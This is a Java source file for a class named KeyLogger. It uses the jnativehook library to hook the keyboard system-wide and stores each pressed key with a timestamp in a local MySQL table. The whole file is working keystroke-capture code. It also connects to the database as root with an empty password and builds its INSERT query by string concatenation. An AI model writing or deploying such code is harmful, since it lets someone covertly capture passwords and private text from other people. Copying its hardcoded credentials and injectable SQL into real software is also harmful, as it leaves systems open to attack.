import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.Properties;
import java.util.logging.FileHandler;
import java.util.logging.Logger;
import java.util.logging.SimpleFormatter;
import javax.swing.JOptionPane;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 * Logs keystrokes in a log file.
 * @author Samir Joglekar
 */
public class KeyLogger implements NativeKeyListener,Runnable {
	String configFilePath = null;
	Logger logger = null;
	FileHandler fileHandler = null;
	SimpleFormatter simpleFormatter = null;
	InputStream inputStream = null;
	Properties properties = null;
	Path currentRelativePath = null;

	
	
	
	public void run(){
		try{
			
		GlobalScreen.registerNativeHook();
		GlobalScreen.addNativeKeyListener(new KeyLogger());
		}
		catch(Exception e)
		{
			
		}
		
	}
	
	/**
	 * The constructor.
	 * @throws IOException
	 */
	
	public KeyLogger()// throws IOException 
	{
            try{
		logger = Logger.getLogger("KeyLog");
		currentRelativePath = Paths.get("");
		inputStream = new FileInputStream("Config.properties");//
		properties = new Properties();
		properties.load(inputStream);
		configFilePath = properties.getProperty("FilePath");
		fileHandler = new FileHandler(configFilePath);
		logger.addHandler(fileHandler);
		simpleFormatter = new SimpleFormatter();
		fileHandler.setFormatter(simpleFormatter);
		}
		catch(Exception e)
		{
			
		}
	}

	/**
	 * Overridden method to capture the pressed keys.
	 */
	@Override
	public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
		//logger.info("Key pressed: &" + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode())+"&"+" #"+System.currentTimeMillis()+"#");
               String letter= NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
               long timel=(System.currentTimeMillis());
               String time=""+timel;
               db(letter,time);
	}

	/**
	 * Overridden method to capture released keys.
	 */
	@Override
	public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
	}

	/**
	 * Overridden method to capture the typed keys.
	 */
	@Override
	public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
	}

	/**
	 * The main method.
	 * @param arguments - Command-line arguments
	 * @throws IOException
	 * @throws NativeHookException
	 */

        
        
         public static void db(String letter,String time)
    {
        try
        {
            Connection con;
            Statement stmt;
            ResultSet res;
            String uid="root";
            String pwd="";

            con=DriverManager.getConnection("jdbc:mysql://localhost:3306/problem",uid,pwd);
            stmt=con.createStatement();
            String qry="INSERT INTO log (keytyped,time) VALUES('"+letter+"','"+time+"')";
            stmt.executeUpdate(qry);// if no data is recived then use executeUpdate when data uis recieved executeQuery
            System.out.println(qry);
            //JOptionPane.showMessageDialog(this,"Data Saved","Status",JOptionPane.INFORMATION_MESSAGE);
        }
        catch(Exception ex)
        {
            JOptionPane.showMessageDialog(null,ex.getMessage(),"Status",JOptionPane.ERROR_MESSAGE);
        }
    }
        
        
        
        
        
        
        
        
        
}